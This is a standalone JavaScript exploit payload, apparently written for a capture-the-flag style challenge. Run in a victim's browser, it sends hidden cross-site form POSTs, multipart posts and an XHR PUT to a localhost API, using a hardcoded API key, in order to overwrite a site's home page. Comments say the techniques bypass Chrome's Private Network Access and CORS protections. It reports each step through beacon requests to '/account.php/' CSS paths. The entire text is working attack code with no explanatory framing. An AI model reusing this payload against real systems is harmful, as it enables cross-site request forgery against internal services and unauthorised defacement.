(async () => {
  const T = "VTG919";
  const K = "vk_live_daf5f1744a7bfbbeefe31e1544ca1d4ee214";
  const SEIZED_B64 = "";
  const S = decodeURIComponent(escape(atob(SEIZED_B64)));

  const bc = async (k) => { try { await fetch('/account.php/'+T+'_'+k+'.css',{credentials:'include',cache:'no-store'}); } catch(e){} };
  const chk = async () => { try { return (await (await fetch('/?_nc='+Date.now(),{cache:'no-store'})).text()).includes('CT-CASE'); } catch(e){ return false; } };

  await bc('A');

  // Helper: create hidden iframe + form and submit cross-site POST (bypasses PNA + CORS)
  // HTML form submissions are NOT subject to Chrome's Private Network Access restrictions
  const formPost = (url, fields) => new Promise((resolve) => {
    const iframe = document.createElement('iframe');
    iframe.name = 'sf_'+Math.random().toString(36).slice(2,8);
    iframe.style.cssText = 'display:none;width:0;height:0;position:absolute;';
    document.body.appendChild(iframe);
    iframe.addEventListener('load', () => resolve('loaded'));
    iframe.addEventListener('error', () => resolve('error'));

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.enctype = 'application/x-www-form-urlencoded';
    form.target = iframe.name;
    for (const [n, v] of Object.entries(fields)) {
      const inp = document.createElement('input');
      inp.type = 'hidden'; inp.name = n; inp.value = v;
      form.appendChild(inp);
    }
    document.body.appendChild(form);
    form.submit();
    // Resolve after 3s even if no load event (headless may not fire onload for cross-origin)
    setTimeout(() => resolve('timeout'), 3000);
  });

  const kq = '?api_key='+K;

  // Phase 1: Form POST to localhost (bypasses Private Network Access!)
  await formPost('http://127.0.0.1/api/pages/home'+kq, {body: S, slug: 'home'});
  await bc('FORM1');
  if (await chk()) { await bc('WIN_FORM1'); return; }

  await formPost('http://127.0.0.1/api/pages'+kq, {slug: 'home', body: S});
  await bc('FORM2');
  if (await chk()) { await bc('WIN_FORM2'); return; }

  await formPost('http://127.0.0.1/api/page/home'+kq, {body: S});
  await bc('FORM3');
  if (await chk()) { await bc('WIN_FORM3'); return; }

  // Phase 2: multipart/form-data (different enctype)
  const formPostMulti = (url, fields) => new Promise((resolve) => {
    const iframe = document.createElement('iframe');
    iframe.name = 'mf_'+Math.random().toString(36).slice(2,8);
    iframe.style.cssText = 'display:none;width:0;height:0;position:absolute;';
    document.body.appendChild(iframe);

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.enctype = 'multipart/form-data';
    form.target = iframe.name;
    for (const [n, v] of Object.entries(fields)) {
      const inp = document.createElement('input');
      inp.type = 'hidden'; inp.name = n; inp.value = v;
      form.appendChild(inp);
    }
    document.body.appendChild(form);
    form.submit();
    setTimeout(() => resolve('timeout'), 2000);
  });

  await formPostMulti('http://127.0.0.1/api/pages/home'+kq, {body: S, slug: 'home'});
  await bc('MFORM1');
  if (await chk()) { await bc('WIN_MFORM1'); return; }

  // Phase 3: XHR (different from fetch, older API, might bypass PNA in some browsers)
  await new Promise((resolve) => {
    const xhr = new XMLHttpRequest();
    xhr.open('PUT', 'http://127.0.0.1/api/pages/home'+kq, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onreadystatechange = () => { if (xhr.readyState === 4) resolve(); };
    xhr.onerror = resolve;
    try { xhr.send(JSON.stringify({body: S})); } catch(e) { resolve(); }
    setTimeout(resolve, 3000);
  });
  await bc('XHR1');
  if (await chk()) { await bc('WIN_XHR1'); return; }

  await bc('DONE');
})();
